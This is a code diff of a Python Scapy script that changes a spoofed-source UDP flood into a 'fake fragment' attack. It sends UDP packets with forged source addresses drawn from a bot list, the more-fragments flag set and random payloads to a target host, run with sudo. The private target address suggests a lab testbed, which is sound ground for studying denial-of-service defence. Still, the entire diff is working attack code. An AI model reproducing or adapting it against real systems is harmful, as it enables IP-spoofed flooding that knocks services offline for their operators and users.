@@ -4,19 +4,16 @@ import random
 import time
 import sys
 import ipaddress
+import os
 
-# Ataque simples UDP Flood, sem payload.
-# IP Spoofing, RandomSRCPort e 3000 bots.
-
-# CONFIGURAÇÃO DO ATAQUE
+# UDP Fake Frag
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "bots.txt"
-
-PPS = 100
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
+PACKET_PAYLOAD_SIZE = 512
 
 def load_bots(filename):
-    """Colocar os bots do arquivo em uma lista."""
     bot_ips = []
 
     with open(filename, "r") as f:
@@ -28,8 +25,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_flood_attack():
-    """UDP Flood Attack"""
+def run_udp_fake_frag():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -39,35 +35,32 @@ def run_udp_flood_attack():
     while True:
         source_ip = random.choice(bot_ips)
 
-        ip_layer = IP(src=source_ip, dst=TARGET_IP)
+        ip_layer = IP(src=source_ip, dst=TARGET_IP, flags="MF")
         eth_layer = Ether()
         udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)
 
+        payload = os.urandom(PACKET_PAYLOAD_SIZE)
 
-        packet = eth_layer / ip_layer / udp_layer 
-        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Sumário): {packet.summary()}")
-
-        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Show2 - como seria enviado):")
-        #packet.show2()
+        packet = eth_layer / ip_layer / udp_layer / Raw(load=payload)
 
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if(numero_de_pacotes_enviados == 1000):
+        if(numero_de_pacotes_enviados == 100):
             break
 
 
     start_time = time.perf_counter()
-    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True, pps=PPS)
+    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
-
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 
 if __name__ == "__main__":
-    run_udp_flood_attack()
+    run_udp_fake_frag()
 
-# sudo PYTHONPATH=$HOME/scapy python3 udp_taxa_fixa.py
+
+# sudo PYTHONPATH=$HOME/scapy python3 udp_fake_frag.py
